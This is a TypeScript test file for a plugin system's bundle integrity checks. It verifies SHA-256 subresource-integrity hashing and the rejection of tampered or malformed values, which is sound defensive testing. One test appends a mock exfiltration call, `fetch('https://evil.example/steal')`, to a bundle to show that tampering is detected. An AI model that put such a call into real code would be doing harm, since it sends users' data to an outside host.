import { describe, it, expect } from 'vitest';
import { createHash } from 'node:crypto';
import {
  computeIntegrity,
  isValidIntegrity,
  verifyIntegrity,
} from '../../src/plugins/runtime/integrity';

const BUNDLE = new TextEncoder().encode('export default { id: "demo", Panel: () => null };');

/** independent of the code under test: node hashes the same bytes */
function nodeIntegrity(bytes: Uint8Array): string {
  return `sha256-${createHash('sha256').update(bytes).digest('base64')}`;
}

describe('plugin bundle integrity', () => {
  it('hashes bytes to the sha256 SRI value node computes', async () => {
    expect(await computeIntegrity(BUNDLE)).toBe(nodeIntegrity(BUNDLE));
  });

  it('accepts bytes that match the expected value', async () => {
    expect(await verifyIntegrity(BUNDLE, nodeIntegrity(BUNDLE))).toBe(true);
  });

  it('rejects a single flipped byte', async () => {
    const tampered = new Uint8Array(BUNDLE);
    tampered[0] ^= 0x01;
    expect(await verifyIntegrity(tampered, nodeIntegrity(BUNDLE))).toBe(false);
  });

  it('rejects code appended after the hash was taken', async () => {
    const withPayload = new TextEncoder().encode(
      `${new TextDecoder().decode(BUNDLE)};fetch('https://evil.example/steal')`,
    );
    expect(await verifyIntegrity(withPayload, nodeIntegrity(BUNDLE))).toBe(false);
  });

  it('treats a missing or malformed integrity value as a refusal', async () => {
    const cases = [
      undefined,
      null,
      '',
      'sha256-',
      'not-an-integrity-value',
      // right shape, wrong algorithm
      `sha512-${createHash('sha512').update(BUNDLE).digest('base64')}`,
      // base64url alphabet instead of the standard one SRI uses
      `sha256-${'_'.repeat(43)}=`,
      // truncated digest
      `sha256-${'A'.repeat(20)}=`,
    ];
    for (const value of cases) {
      expect(isValidIntegrity(value)).toBe(false);
      expect(await verifyIntegrity(BUNDLE, value)).toBe(false);
    }
  });

  it('hashes over exact bytes, not a decoded string', async () => {
    // the same code with a trailing newline is a different bundle
    const withNewline = new TextEncoder().encode(`${new TextDecoder().decode(BUNDLE)}\n`);
    expect(await computeIntegrity(withNewline)).not.toBe(await computeIntegrity(BUNDLE));
  });
});
